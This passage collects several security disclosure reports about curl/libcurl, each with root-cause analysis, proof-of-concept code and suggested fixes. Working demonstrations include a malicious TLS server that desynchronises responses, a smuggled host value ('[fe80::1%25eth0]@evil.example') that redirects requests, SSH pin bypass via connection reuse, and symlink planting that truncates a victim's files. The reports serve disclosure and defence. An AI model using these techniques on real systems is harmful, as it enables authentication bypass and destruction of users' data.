use different connections (ids 0 and 1). The confusion happens at the TLS
session layer.

## Reproduce

One file, one command:

```sh
./poc_sslctx.py
```

It runs the bug case, the failed-workaround case and the control by itself.

The script generates two client certificates (alice, bob) and a server
certificate, builds its C client against the installed libcurl, starts an mTLS
server, and runs three cases. Server connections, callbacks and responses are
printed while they happen:

1. `default` — bug: both connections show `alice-client`
2. `forbid-reuse` — callback sets `CURLOPT_FORBID_REUSE`, still `alice-client`
3. `no-session-cache` — `CURLOPT_SSL_SESSIONID_CACHE=0`, server shows
   `bob-client`

To use a libcurl built from the `curl-8_23_0` tag instead of the system
library (full commands in [REPRODUCE.md](REPRODUCE.md)):

```sh
CURL_CFLAGS="-I$PWD/curl/include" \
CURL_LIBS="$PWD/curl/build/lib/libcurl.a -lssl -lcrypto -lpsl \
-lbrotlidec -lbrotlicommon -lz -lzstd -lpthread -ldl" \
./poc_sslctx.py
```

Full walkthrough, including building libcurl from source:
[REPRODUCE.md].

## Evidence

Server log, default case (8.23.0):

```
CONN#1 from ('127.0.0.1', 42158): client_cert_CN=alice-client  first_line=b'GET / HTTP/1.1'
CONN#2 from ('127.0.0.1', 42164): client_cert_CN=alice-client  first_line=b'GET / HTTP/1.1'
```

Client output from the same run:

```
[callback] loading alice.crt into SSL_CTX
connection id: 0

=== request 2: bob's SSL_CTX_FUNCTION ===
[callback] loading bob.crt into SSL_CTX
connection id: 1

resp1: seen-cert=alice-client
resp2: seen-cert=alice-client

connections: 0 then 1 (separate connections)
identity the server actually saw: alice-client
RESULT: BUG (bob authenticated as alice)
```

Control case with the session cache disabled:

```
CONN#2 from ('127.0.0.1', 54416): client_cert_CN=bob-client
resp2: seen-cert=bob-client
RESULT: OK (bob authenticated as bob)
```

The default case reproduced on every run with 8.23.0 and master, and also
reproduced with 8.21.0 and 8.22.0. The control always flipped to bob.

Screenshot of the full run, all three cases in one capture:

- [sslctx-full-run.png](screenshots/sslctx-full-run.png)

## The documented workaround does not work

`docs/libcurl/opts/CURLOPT_SSL_CTX_FUNCTION.md` says:

> The CURLOPT_SSL_CTX_FUNCTION callback allows the application to reach in and
> modify SSL details in the connection without libcurl itself knowing anything
> about it, which then subsequently can lead to libcurl unknowingly reusing SSL
> connections with different properties. To remedy this you may set
> CURLOPT_FORBID_REUSE from the callback function.

Setting `CURLOPT_FORBID_REUSE` inside both callbacks gives two separate
connections but the same result: the second connection resumes the first
session and the server still sees `alice-client`. The workaround covers
connection reuse, not session resumption. Only
`CURLOPT_SSL_SESSIONID_CACHE=0` changes the outcome.

## What I checked

- `match_ssl_primary_config()` in `lib/vtls/vtls_config.c` is complete for
  `ssl_primary_config`; this is not a connection-reuse bug.
- `fsslctx` has 20 references in `lib/`: setopt storage, the OpenSSL, wolfSSL
  and mbedTLS backends that invoke the callback, DoH propagation and the
  callback bookkeeping in `api.c`. `grep -rn fsslctx lib/vtls/vtls_scache.c`
  returns nothing, so the session cache cannot see the callback at all.
- `docs/libcurl/opts/CURLOPT_SSL_SESSIONID_CACHE.md` says "nothing ever should
  get hurt by attempting to reuse SSL session-IDs". This is a counterexample.
- Searched curl issues and PRs for `SSL_CTX_FUNCTION session`,
  `session resumption client cert` and `fsslctx`; no existing report matches.

## Suggested fix

Only reuse a cached session when the callback identity matches. The pointer
values are enough:

- add `ssl_fsslctx` and `ssl_fsslctxp` to the peer key in
  `ssl_peer_key_build()`, or
- do not cache or resume sessions for handles where `ssl_fsslctx` is set.

A test can use two callbacks that load different client certs and assert the
second connection is authenticated as the second identity.

## Impact

An application that uses `CURLOPT_SSL_CTX_FUNCTION` to select a client
certificate per request against the same host, for example a gateway or proxy
that authenticates to one backend as different tenants, can have one tenant's
request authenticated as another tenant. The correct callback runs and returns
success, the server accepts a valid resumption, and nothing reports an error.

Preconditions are specific: the client certificate must be set only through the
callback, and both handles must share a multi handle so they share the session
cache. In exchange the impact is a server-side identity mix-up, which is why I
rate this Medium. The project has fixed this class twice before
(CVE-2016-5419, CVE-2017-7468) for the normal certificate options.

title: curl reuses an HTTPS connection when a response is already buffered in the TLS stack
weakness: Acceptance of Extraneous Untrusted Data With Trusted Data
body:
curl master (`15292ed75`, `8.23.1-DEV`) reuses an idle HTTP/1.1-over-TLS
connection even when a complete extra response is already buffered in
OpenSSL/GnuTLS. The `ef6b17cf1` fix only polls the socket:
`Curl_cpool_conn_seems_healthy()` (`lib/conncache.c:1073`, called from
`lib/url.c:1071`) uses `Curl_conn_is_alive()`, and `cf_ssl_is_alive()`
(`lib/vtls/vtls.c:1287`) delegates to `cf_socket_conn_is_alive()`
(`lib/cf-socket.c:1811`) without checking TLS buffers. The body read is
clamped to `Content-Length` (`lib/transfer.c:187`), so the TLS read decrypts a
whole record, returns the body, and leaves the stray response buffered while
the socket is empty. Reproduced on OpenSSL 3.0.13 and GnuTLS 3.8.3 (OpenSSL
also with full certificate verification): `/b` gets `stray` instead of
`second`, and every later response is shifted by one (RFC 9112 section 9.2).
Plain HTTP is correctly not reused, and `tests/data/test1701` only covers
`<server>http</server>`, so the fix has no TLS coverage. Fix: make
`cf_ssl_is_alive()` report `SSL_pending()`/`SSL_has_pending()` (or the backend
equivalent) as pending input, and add an HTTPS variant of test 1701.

## Proof of Concept
```sh
openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem \
  -days 1 -subj /CN=localhost
python3 poc.py 9443
```
`poc.py`:
```python
import socket, ssl, sys, time
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain("cert.pem", "key.pem")
srv = socket.socket()
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", int(sys.argv[1])))
srv.listen(1)
c, _ = srv.accept()
s = ctx.wrap_socket(c, server_side=True)
req = b""
while b"\r\n\r\n" not in req:
    req += s.recv(4096)
s.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\n")
time.sleep(0.3)
s.sendall(b"first" + b"HTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\nstray")
time.sleep(0.3)
s.settimeout(3.0)
try:
    s.recv(4096)  # second request on the reused connection
    s.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 6\r\n\r\nsecond")
except OSError:
    pass
s.close()
```
Then:
```sh
curl -k -sS --http1.1 -w '\n' https://127.0.0.1:9443/a https://127.0.0.1:9443/b
```
Expected (fixed):
```
first
second
```
Actual:
```
first
stray
```
`curl -v` shows `Reusing existing https: connection` for `/b`. The PoC uses a
single connection; if curl correctly opens a new one, `/b` stalls or is
refused.

## Impact

On a reused HTTPS/1.1 connection, a server can make curl bind a response it
sent earlier to a later request. The real response remains unread, so every
subsequent response is one request behind. Applications that rely on the
one-response-per-request mapping (authentication, caching, parsing,
multi-resource fetches on one handle) can act on the wrong response,
violating RFC 9112 section 9.2.

title: urlapi: CURLUPART_HOST accepts text after an IPv6 zone ip and URL round trip changes the host
body:
## Summary:
[six or fewer sentences describing the issue in your own human voice and optionally a short proof-of-concept script]
An app can set a host from untrusted input from CURLUPART_HOST, as the docs allow, and rely on curl to reject bad hosts. curl accepts [fe80::1%25eth0]@evil.example/x as a valid IPv6 host. The URL it then builds has evil.example as its host. Any code that uses that URL string goes to evil.example. libcurl also sends the follow-up request there after a relative redirect from the IPv6 server. An attack needs an app that sets untrusted hosts this way, and i do not know of one.

## Affected version
[Which curl/libcurl version are you using to reproduce? On which platform? `curl -V` typically generates good output to include]
curl 8.10.0 through 8.23.0

## Steps To Reproduce:
[add details for how we can reproduce the issue]
Paste this: 1. Build libcurl 8.10.0 or later (I tested 8.10.0, 8.23.0, and master `c4b341c`).
2. Save the program from the report as `repro.c`.
3. Compile it:
   ```bash
   cc repro.c -I<curl>/include -L<curl>/lib -lcurl -o repro
   ```
4. Run `./repro`.

**Expected:** `curl_url_set()` rejects the host, the same way it rejects `[::1]junk` with `CURLUE_BAD_HOSTNAME`.

**Actual:**
```
set host: rc=0
host:     [fe80::1%25eth0]@evil.example/x
url:      http://[fe80::1%25eth0]@evil.example/%25eth0]/
reparse:  rc=0 host=evil.example
```

**Redirect case**

1. Start an HTTP server on `[::1]:18934` that answers `302` with `Location: /next`.
2. Start any HTTP server on `127.0.0.1:18933`.
3. Set the host to `[::1%25lo0]@127.0.0.1:18933/x` and the port to `18934`. On Linux, use `lo` in place of `lo0`.
4. Pass the handle with `CURLOPT_CURLU`, set `CURLOPT_FOLLOWLOCATION` to `1`, and run the transfer.
5. The first request goes to `[::1]:18934`. The second request goes to `127.0.0.1:18933`.
## Again: there is no bug-bounty for curl. We do not offer any rewards, only proper credits.

## Impact

## Summary:
curl accepts [fe80::1%25eth0]@evil.example/x as a valid IPv6 host.
curl_url_get(CURLUPART_URL) then gives a URL whose host is evil.example. Any code that logs, stores, or fetches that URL uses the wrong host.
With CURLOPT_CURLU and CURLOPT_FOLLOWLOCATION, libcurl sends the first request to the IPv6 address. A relative redirect from that server sends the next request to the other host and port.
An attack needs an app that passes untrusted hosts to CURLUPART_HOST

title: wolfSSL Backend Silently Ignores --cert-status (OCSP Stapling Bypass)
body:
## Summary
When curl is built with the wolfSSL TLS backend, `--cert-status` (`CURLOPT_SSL_VERIFYSTATUS`) is silently accepted and ignored. The wolfSSL backend sets `cert_status_request = NULL` in its vtable (`lib/vtls/wolfssl.c:2309`), meaning OCSP stapling is not implemented. The `curl_easy_setopt()` call returns `CURLE_NOT_BUILT_IN`, but the CLI tool at `src/config2setopts.c:442` discards this return value — the user gets no error, no warning, and the connection proceeds without OCSP verification.

This is confirmed exploitable on the HTTP/3 (QUIC) path where a server providing no OCSP staple is accepted despite `--cert-status` being set.

## Root Cause (

**Layer 1 — wolfSSL backend lacks OCSP support:**
`lib/vtls/wolfssl.c:2309` — vtable entry:
```c
NULL,                            /* cert_status_request */
```

Zero references to `verifystatus` or OCSP anywhere in `wolfssl.c`. Compare with OpenSSL (6 references) and GnuTLS (4 references).

**Layer 2 — CLI silently drops the error:**
`src/config2setopts.c:441-442`:
```c
if(config->verifystatus)
    my_setopt_long(curl, CURLOPT_SSL_VERIFYSTATUS, 1);
```

`my_setopt_long` expands to `curl_easy_setopt()` and the `CURLE_NOT_BUILT_IN` return is discarded. No warning printed, no error to the user.

**Layer 3 — QUIC path also has no check:**
`lib/vquic/vquic-tls.c:169-186` — wolfSSL QUIC verification checks `verifyhost` (line 171) and pinned key (line 186) but has no `verifystatus` check, even as a "not supported" error.

## Proof of Concept

Docker container: curl 8.23.1-DEV built with wolfSSL 5.9.4, ngtcp2 1.8.1, nghttp3 1.6.0.
QUIC server: ngtcp2 `wsslserver` example (no OCSP staple configured).

### Test A: H3 without --cert-status (control)

```
curl --http3-only --insecure https://127.0.0.1:4434/
→ exit:0 http:404 (works as expected)
```

### Test B: H3 WITH --cert-status (VULNERABILITY)

```
curl --http3-only --insecure --cert-status https://127.0.0.1:4434/
→ exit:0 http:404
```

Server provides NO OCSP staple. `--cert-status` is set but silently ignored. Full HTTP/3 connection succeeds:
```
* SSL connection using TLSv1.3 / TLS13-AES128-GCM-SHA256
* [HTTP/3] [0] OPENED stream for https://127.0.0.1:4435/
> GET / HTTP/3
< HTTP/3 404
```

**Expected behavior:** Either reject the connection with `CURLE_SSL_INVALIDCERTSTATUS`, or error at startup with "OCSP stapling not supported with this TLS backend."

## Suggested Fix

**Option A (minimal):** Make `config2setopts.c` check the return value and warn/error:
```c
if(config->verifystatus) {
    result = my_setopt_long(curl, CURLOPT_SSL_VERIFYSTATUS, 1);
    if(result == CURLE_NOT_BUILT_IN) {
        warnf(global, "OCSP stapling not supported by this TLS backend");
        return result;
    }
}
```

**Option B (complete):** Add `verifystatus` check to the wolfSSL QUIC path at `vquic-tls.c`:
```c
if(conn_config->verifystatus) {
    failf(data, "OCSP stapling not supported with wolfSSL QUIC");
    return CURLE_SSL_INVALIDCERTSTATUS;
}
```

## Impact

1. User sets `--cert-status` expecting OCSP stapling enforcement — it is silently ignored
2. A revoked certificate that would be caught by OCSP is accepted without warning
3. Applications using `CURLOPT_SSL_VERIFYSTATUS` with wolfSSL have a false sense of security
4. The silent failure is worse than a crash — the user believes they have OCSP protection when they do not

title: SSH host-key policy is missing from the connection-reuse tuple: strict pins and knownhosts are silently skipped on reused SFTP/SCP connections
body:
(The core effect is a silent host-authentication bypass: a transfer whose
configured SSH host-key policy would reject the server is served anyway, with
exit code 0 and no warning, because it reuses a pooled connection established
under a weaker or absent policy. curl may assess this lower because it
requires two SSH transfers on one connection pool with differing policies —
but that is exactly what `--next` and every multi-transfer libcurl application
do.)

## Affected version

curl 8.23.0, tag curl-8_23_0, commit 3163ec065643ba20709f190111f42c3e1fe95273.

The gap is also present in current master, 7ab9cad703 (8.23.1-DEV), and is
old: `ssh_config_matches()` has compared only the client key-pair paths since
it was introduced by the CVE-2022-27782 fix (1645e9b445, released 7.82.0),
and no host-key policy parameter has ever been part of the SSH reuse
identity. The host-key pin/knownhosts options themselves are much older
(`CURLOPT_SSH_KNOWNHOSTS` 7.19.6, `CURLOPT_SSH_HOST_PUBLIC_KEY_MD5` 7.16.4,
`CURLOPT_SSH_HOST_PUBLIC_KEY_SHA256` 7.79.0, `CURLOPT_SSH_HOSTKEYFUNCTION`
7.79.0), so the md5/knownhosts variants of this report predate 7.82.0.

## Affected interface

Both the libcurl API and the curl command-line frontend.

- **CLI**: all transfers of one `curl` invocation share one multi handle and
  therefore one connection pool. `curl sftp://host/a [policy A] --next
  sftp://host/b [policy B]` reproduces the bypass with no unusual options.
- **API**: two easy handles on one multi handle, or one easy handle reused
  across `curl_easy_perform()` calls (connection cache is retained when
  `CURLOPT_FRESH_CONNECT`/`FORBID_REUSE` are not set).

Silently skipped on reuse: `CURLOPT_SSH_KNOWNHOSTS`,
`CURLOPT_SSH_HOST_PUBLIC_KEY_SHA256`, `CURLOPT_SSH_HOST_PUBLIC_KEY_MD5`,
`CURLOPT_SSH_HOSTKEYFUNCTION` (CLI: `--knownhosts`, `--hostpubsha256`,
`--hostpubmd5`, and a `-k` first transfer). Protocols: `sftp://` and
`scp://`. The matcher lives in protocol-agnostic code (`lib/url.c`), so both
SSH backends (libssh2 and libssh) are affected; the PoC below uses libssh2
1.11.1.

## Summary

For SFTP and SCP, libcurl verifies the server host key only inside the SSH
connect state machine. When a transfer reuses an existing pooled connection,
that state machine never runs — and the connection-reuse matcher for SSH
(`ssh_config_matches()`) compares only the client private/public key paths.
None of the host-key policy options (knownhosts file, SHA256 pin, MD5 pin,
host-key callback) participate in the reuse decision.

The result: if transfer A on a pool accepts the host under a lax policy (an
accepting knownhosts file, `-k`, or — in the API — no policy at all, which the
libssh2 backend documents as accepted: "SSH: no knownhosts file configured"),
and transfer B to the same `host:port` with the same credentials and the same
client key configures a strict policy that would reject that same host key,
B silently rides A's connection. B's pin/knownhosts check is never evaluated,
the transfer succeeds, and curl exits 0.

This is the host-key half of the tuple that CVE-2022-27782 started fixing in
7.82.0; that fix covered only the client key pair (`priv_key`/`pub_key`).

## Root cause

`lib/url.c:569-579` — the entire SSH identity comparison applied when
deciding whether a pooled connection can be reused:

```c
static bool ssh_config_matches(struct connectdata *one,
                               struct connectdata *two)
{
  struct ssh_conn *sshc1, *sshc2;

  sshc1 = Curl_conn_meta_get(one, CURL_META_SSH_CONN);
  sshc2 = Curl_conn_meta_get(two, CURL_META_SSH_CONN);
  return sshc1 && sshc2 && Curl_safecmp(sshc1->priv_key, sshc2->priv_key) &&
         Curl_safecmp(sshc1->pub_key, sshc2->pub_key);
}
```

It is consumed by the reuse matcher at `lib/url.c:853-859`
(`url_match_proto_config()`), which calls it for every SSH-family needle and
otherwise only checks the HTTP version. The host-key policy options live on
the easy handle (`data->set.*`) and are consumed exclusively inside the
connect state machines:

- `libssh2.c:481-589` `ssh_check_fingerprint()` — SHA256/MD5 pin comparison,
  `CURLOPT_SSH_HOSTKEYFUNCTION` callback;
- `libssh2.c:306-` `ssh_knownhost()` — knownhosts file comparison
  (and at `libssh2.c:319-322`: with no knownhosts configured, the libssh2
  backend accepts any host key by default);
- `libssh.c` `myssh_is_known()` — the libssh equivalents.

On reuse these never execute: `Curl_connect()` sets `conn->bits.reuse`
(`lib/url.c:2358`) and then skips `Curl_conn_setup()` — which owns the SSH
filter chain and its state machine — for reused connections
(`lib/url.c:2508-2518`). SFTP/SCP connections are pooled in the first place
because `Curl_scheme_sftp`/`Curl_scheme_scp` carry `PROTOPT_CONN_REUSE`
(`lib/protocol.c`).

The asymmetry with TLS is by design, not by accident: on TLS connections the
reuse matcher compares `pinned_key`, `CAfile`, `CApath`, `ca_info_blob`,
`verifypeer`, `verifyhost`, `verifystatus`, and more
(`match_ssl_primary_config()`, `lib/vtls/vtls_config.c`) — every parameter
that changes how the peer is authenticated. SSH compares none of its
equivalents. Function history: 1645e9b445 (CVE-2022-27782, client keys only)
→ removal in 3e9817cd1b → reinstated unchanged in 0618ffe50d (June 2026);
the 2026 connection-matching hardening commits (7c11f1a1bd, d37d79df1e,
c5f9b8b405, 7541ae569d, 72352daba0) each added a parameter to the
TLS/FTP/generic tuples and left `ssh_config_matches()` untouched.

## Reproduction

I used an attached pair of harnesses with a one-shot loopback SFTP listener:
`t1_sftp_server.py` (a paramiko-based SFTP server with a fixed ed25519 host
key, public-key-only client auth, serving `/a.txt` and `/b.txt`, logging every
SSH session establishment) and `t1_matrix.sh` (the 8-mode matrix, one
command, full rerun), plus `t1_api_reuse.c` for the libcurl API leg.
`t1_gen_keys.py` creates the key material: a client key pair, a second client
key pair, a knownhosts file containing the real host key (`kh_lax`), one
containing a different key (`kh_wrong`), and the SHA256/MD5 pins of the real
and of the wrong key.

Build the client against curl 8.23.0 with an SSH backend:

```
git worktree add curl-8230 curl-8_23_0
cmake -S curl-8230 -B curl-8230/build -G Ninja \
  -DCMAKE_BUILD_TYPE=RelWithDebInfo -DCURL_USE_OPENSSL=ON \
  -DCURL_USE_LIBSSH2=ON -DBUILD_SHARED_LIBS=OFF -DBUILD_TESTING=OFF
cmake --build curl-8230/build -j
```

In terminal 1:

```
python3 t1_sftp_server.py
```

In terminal 2, the core exploit — transfer A verifies against a knownhosts
file containing the real host key, then transfer B in the same invocation
carries a SHA256 pin of a *different* key (guaranteed mismatch on a fresh
connection):

```
./curl-8230/build/src/curl -v \
  sftp://alice@127.0.0.1:21032/a.txt \
  --key t1keys/client_key --pubkey t1keys/client_key.pub \
  --knownhosts t1keys/kh_lax -o /dev/null \
  --next \
  sftp://alice@127.0.0.1:21032/b.txt \
  --key t1keys/client_key --pubkey t1keys/client_key.pub \
  --hostpubsha256 U1eyPFUfFCiydwk06rrVV0fzJZt+NFnxgMBFKM3LGHc=
```

Observed (verbose output, abridged):

```
* SSH: found host '127.0.0.1' in '.../kh_lax'
* SSH: knownhost entry matches host key
* SSH: authenticated via publickey
* Connection #0 to host 127.0.0.1:21032 left intact
* SSH: public key file '.../client_key.pub'
* SSH: private key file '.../client_key'
* Reusing existing sftp: connection with host 127.0.0.1
B-file: contents of b.txt
```

Exit code 0. Note what is *absent* from the second transfer's log: the lines
`SSH: SHA256 public key '...'` / fingerprint comparison that
`ssh_check_fingerprint()` always prints when it runs. B's pin was never even
looked at.

Control — the identical strict transfer on a fresh connection (same command
without the `--next` part):

```
curl: (60) Denied establishing ssh session: mismatch SHA256 fingerprint. Remote +GYld9L+5Tx7MghowSBPRGosG2dbWbNZb62imlzhUjs= is not equal to U1eyPFUfFCiydwk06rrVV0fzJZt+NFnxgMBFKM3LGHc=
```

Full 8-mode matrix (`./t1_matrix.sh`, one command):

```
M1-reuse-wrongSHA256            rc=0   reuse=1   A:knownhosts(real)  B:--hostpubsha256 WRONG
M2-reuse-wrongMD5               rc=0   reuse=1   A:knownhosts(real)  B:--hostpubmd5 WRONG
M3-reuse-wrongknownhosts        rc=0   reuse=1   A:knownhosts(real)  B:--knownhosts WRONG-key
M4-reuse-A-insecure             rc=0   reuse=1   A:-k                B:--hostpubsha256 WRONG
--- controls ---
M5-fresh-wrongSHA256            rc=60  reuse=0   single transfer, wrong pin
M6-fresh-wrongknownhosts        rc=60  reuse=0   single transfer, wrong knownhosts
M7-fresh-correctSHA256          rc=0   reuse=0   single transfer, correct pin (sanity)
M8-reuse-diffclientkey          rc=60  reuse=0   A lax, B wrong pin AND different client key
```

M1-M4 all print `* Reusing existing sftp: connection with host 127.0.0.1`
and deliver `B-file: contents of b.txt` with exit 0: every strict policy is
silently skipped on reuse. M5-M7 prove the same policies reject/accept
correctly on fresh connections. M8 proves the CVE-2022-27782 client-key
comparison still works (a different client key blocks reuse, forcing a fresh
connection, on which the pin then correctly fails the transfer) — isolating
the host-key policy gap as the only missing tuple element.

libcurl API leg (`t1_api_reuse`, two easy handles on one multi handle; A
sets no host-key policy at all, B sets the wrong SHA256 pin):

```
E2 fresh wrong-pin control: result=60 (peer verification) -- expect 60
E1 transfer A (no host-key policy): result=0 newconn=1
E1 transfer B (wrong sha256 pin):  result=0 newconn=0 -- pin silently skipped
```

`CURLINFO_NUM_CONNECTS == 0` for B is the reuse proof at API level; the
wrong pin returns success.

## Suggested fix

Extend the SSH reuse identity with the host-key policy parameters, mirroring
what `match_ssl_primary_config()` does for TLS. In practice: store the
resolved policy on `struct ssh_conn` when `ssh_setup_connection()` builds the
connection metadata (it already stores `priv_key`/`pub_key` there), and
compare in `ssh_config_matches()`:

- `CURLOPT_SSH_KNOWNHOSTS` (path string, safecmp),
- `CURLOPT_SSH_HOST_PUBLIC_KEY_SHA256` and `CURLOPT_SSH_HOST_PUBLIC_KEY_MD5`
  (presence and value),
- presence of `CURLOPT_SSH_HOSTKEYFUNCTION` (callback identity if
  practical),
- optionally `CURLOPT_SSH_AUTH_TYPES` and `CURLOPT_SSH_COMPRESSION` for
  completeness.

A mismatch should simply prevent reuse (the strict transfer then opens its
own connection and runs its own verification), which is the same outcome the
client-key comparison already produces.

A regression test can extend the existing SFTP pool-reuse coverage in the
python test suite (`tests/http/test_51*`, the suite that already asserts
`total_connects == 1` for SFTP reuse): transfer A with an accepting policy,
transfer B with a mismatching `CURLOPT_SSH_HOST_PUBLIC_KEY_SHA256`; assert
that B fails with `CURLE_PEER_FAILED_VERIFICATION` (and that a new connection
was made), matching the M1-vs-M5 contrast of the matrix above.

## Impact

Any application that performs more than one SSH transfer per process (or per
connection pool) where the host-key policy differs between transfers gets the
weaker policy for all of them: the first transfer's policy decision is
irreversibly attached to the pooled connection, and later transfers'
`CURLOPT_SSH_HOST_PUBLIC_KEY_SHA256`/`_MD5`, `CURLOPT_SSH_KNOWNHOSTS` and
`CURLOPT_SSH_HOSTKEYFUNCTION` settings are silently ignored. Concretely, an
attacker who controls the channel during transfer A (which may have run with
no verification, `-k`, an accept-all callback, or a knownhosts entry the
attacker satisfied) keeps that channel for transfer B even though B pinned
the genuine host key: B's uploads, downloads and any credentials B applies
flow over the attacker's connection, with curl reporting complete success.

Deployments that use SSH host-key pinning for compliance or because they
assume hostile networks are the ones relying on exactly the guarantee that
is skipped. The failure is silent on both ends: no log line, no error, exit.

title: Symlink-following truncation of arbitrary files in `Curl_fopen()` when saving cookie jars, HSTS, or alt-svc caches
body:
## Affected Component

- `lib/curl_fopen.c`, `Curl_fopen()`, line 98: `curlx_fopen(filename, FOPEN_WRITETEXT)`
- Callers: `lib/cookie.c:1543` (cookie jar save), `lib/hsts.c:390` (HSTS save), `lib/altsvc.c:415` (alt-svc save)
- CLI entry points: `-c` / `--cookie-jar` (`src/config2setopts.c:575`), `--hsts FILE` (`:714`), `--alt-svc FILE` (`:711`)

## Summary

When curl saves a cookie jar (`-c` / `--cookie-jar`), an HSTS cache, or an alt-svc cache, `Curl_fopen()` first opens the destination path with mode `"w"` (`lib/curl_fopen.c:98`) so it can inspect the file. That call follows symbolic links and truncates the resolved file before any new data is written.

If an attacker can create a symlink at the cookie-jar path, for example in a shared `/tmp` directory or a shared CI workspace, the victim's curl truncates whatever file the symlink points to, provided the victim can write it. The attacker gains no read access and no code execution. The impact is destruction of the victim's file contents.

The `-J` (Content-Disposition) path already uses `O_CREAT | O_EXCL` to avoid this class of problem, so protection is inconsistent across the codebase.


## Prerequisites

- The attacker can create a directory entry in a directory the victim uses for the cookie-jar path (for example, a sticky `/tmp`, or a shared writable workspace).
- The victim runs curl with `-c` / `--cookie-jar`, or `--hsts` / `--alt-svc`, using that path.
- The target file is writable by the victim's user.
- `fs.protected_symlinks=1` may block cross-owner symlink following in sticky directories on hardened hosts. This mitigates the sticky-directory case. It does not stop the attack from a non-sticky writable directory, where the attacker can already modify files.



## Steps to Reproduce

Tested on Ubuntu 24.04, GCC 13.3, CMake 3.28.3, OpenSSL 3.0.13.

### 1. Build curl from the source snapshot

```bash
cd curl-master
cmake -S . -B build -DCMAKE_BUILD_TYPE=Release \
  -DBUILD_TESTING=OFF -DBUILD_LIBCURL_DOCS=OFF -DBUILD_MISC_DOCS=OFF \
  -DENABLE_CURL_MANUAL=OFF -DCURL_USE_LIBPSL=OFF -DUSE_LIBIDN2=OFF \
  -DCURL_USE_LIBSSH2=OFF -DCURL_ZSTD=OFF -DCURL_BROTLI=OFF \
  -DUSE_NGHTTP2=OFF -DCURL_USE_LIBSSH=OFF -DENABLE_UNIX_SOCKETS=OFF \
  -DCURL_DISABLE_LDAP=ON -DCURL_USE_OPENSSL=ON
cmake --build build --target curl -j"$(nproc)"
./build/src/curl --version      # expect: curl 8.23.1-DEV
```

### 2. Start a local server that sets a cookie

Save as `server.py`:

```python
import http.server, socketserver

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Set-Cookie", "session=abc123; Path=/")
        self.send_header("Content-Length", "2")
        self.end_headers()
        self.wfile.write(b"ok")
    def log_message(self, *a):
        pass

socketserver.TCPServer.allow_reuse_address = True
with socketserver.TCPServer(("127.0.0.1", 8765), H) as s:
    s.serve_forever()
```

```bash
python3 -I server.py &
```

### 3. Create the victim file and the planted symlink

```bash
mkdir -p poc/victim poc/shared
printf 'IMPORTANT VICTIM DATA line 1\nIMPORTANT VICTIM DATA line 2\n' > poc/victim/secret.txt
ln -s "$PWD/poc/victim/secret.txt" poc/shared/cookies.txt
wc -c poc/victim/secret.txt     # 58 bytes before
```

### 4. Run curl with the cookie jar pointed at the symlink

```bash
./build/src/curl -s -c poc/shared/cookies.txt http://127.0.0.1:8765/ -o /dev/null
echo "exit=$?"
```

### 5. Observe

```bash
wc -c poc/victim/secret.txt     # 0 bytes after
ls -l poc/shared/cookies.txt    # now a regular file containing the cookie (non-sticky dir)
tail -1 poc/shared/cookies.txt  # 127.0.0.1  FALSE  /  FALSE  0  session  abc123
```

**Observed:** the victim file went from **58 bytes to 0 bytes**, and the symlink was replaced by the cookie jar.

### 6. Cross-user variant (realistic threat model)

Requires root to set up. The attacker plants the link in a sticky shared directory; an unprivileged user runs curl:

```bash
mkdir -p poc2/shared poc2/victim
chmod 1777 poc2/shared
printf 'VICTIM DATA\n' > poc2/victim/secret.txt
chown -R 65534:65534 poc2/victim
ln -s "$PWD/poc2/victim/secret.txt" poc2/shared/cookies.txt     # created by root

# the unprivileged user must be able to traverse the path and execute the binary
setpriv --reuid=65534 --regid=65534 --clear-groups \
  env -i HOME=/nonexistent ./build/src/curl -s -c poc2/shared/cookies.txt \
  http://127.0.0.1:8765/ -o /dev/null
echo "exit=$?"                  # observed: 0
wc -c poc2/victim/secret.txt    # observed: 0 bytes
ls -l poc2/shared/              # symlink still present; cookie write was dropped
```

**Observed:** the uid-65534 process truncated a file it owns through a symlink planted by a different user. The cookie jar was not written, and curl still exited `0`.

### 7. Optional: permission inheritance

Run step 6 against a non-sticky shared directory, with the target at `0666`:

```bash
chmod 0666 poc3/victim/target.txt
# run the curl command from step 6 against a non-sticky directory, then:
stat -c '%A %U %n' poc3/shared/cookies.txt      # expected: -rw-rw-rw- (inherited from target)
```

This step is derived from the code and is not yet captured for `0666`.

## Expected Result

curl should refuse to write through a symlink at the cookie-jar path, or write only after confirming the destination is a regular file it may replace. It should never truncate a file it does not replace. The `-J` path behaves this way: `O_CREAT | O_EXCL` cannot follow an existing symlink.

## Actual Result

The destination is opened with `"w"` and truncated before any temp-file logic runs. The symlink target is truncated to zero bytes, and in the sticky-directory case curl exits `0` with no cookie jar written.

---

## Root Cause

`lib/curl_fopen.c:97-106`:

```c
#ifndef _WIN32
  *fh = curlx_fopen(filename, FOPEN_WRITETEXT);   /* "w": O_TRUNC, follows symlinks */
  if(!*fh)
    goto fail;
  if(curlx_fstat(fileno(*fh), &sb) == -1 || !S_ISREG(sb.st_mode)) {
    return CURLE_OK;
  }
  curlx_fclose(*fh);
#endif /* !_WIN32 */
  *fh = NULL;
```

The function needs only `sb` (file type and mode) from the existing file. It gets that by opening the file for writing, which has the side effect of truncation. The later `fchmod()` and temp-file creation do not depend on truncation.

## Impact

1. **Data destruction (primary).** Any regular file the victim's curl process can write is truncated to zero bytes. Realistic targets include project configuration files, shell startup files (`~/.bashrc`), SSH `authorized_keys`, and CI build inputs. This is an integrity and availability impact.
2. **Silent loss of the cookie jar.** In a sticky directory such as `/tmp`, the final `rename()` over the attacker-owned symlink is expected to fail with `EPERM`. The code then unlinks the temp file and discards the cookies. In testing, curl still exited `0`, so a script sees no error. (The `EPERM` is inferred from the code path; the observable result was the missing jar and exit `0`.)
3. **Permission inheritance from the symlink target.** When the rename succeeds (non-sticky directory), the temp file is `fchmod`ed to the mode of the file that was truncated. The temp file is created as `0600`, but in testing the new jar came out `0644`, matching the target. If the target is world-writable, the cookie jar becomes world-writable, letting other local users inject cookies into the victim's future sessions. (Observed `0644` in the root test; the `0666` case is derived from the code and not separately captured.)
